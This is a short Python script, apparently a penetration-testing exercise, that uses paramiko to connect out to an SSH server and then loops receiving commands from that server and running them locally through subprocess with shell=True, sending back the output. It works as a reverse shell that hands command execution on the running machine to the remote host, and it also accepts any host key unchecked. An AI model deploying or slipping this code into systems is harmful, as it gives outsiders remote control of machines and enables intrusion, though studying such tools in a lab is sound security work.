import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, password, cmd):
    # let paramiko provide the infrastructure for an SSH connection. Just pass in the required network and auth information
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=password)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode())
        

        while True:
            cmd = ssh_session.recv(1024)
            try:
                cmd = cmd.decode()
                if cmd == 'exit':
                    client.close()
                    break

                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')

            except Exception as e:
                ssh_session.send(str(e))

        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = input("Username: ") or 'emi'
    password = getpass.getpass()

    ip = input('Target IP address: ') or '192.168.1.150'
    port = input('Enter port: ') or 22
    cmd = input('Enter command: ') or 'id'
    ssh_command(ip, port, user, password, cmd)

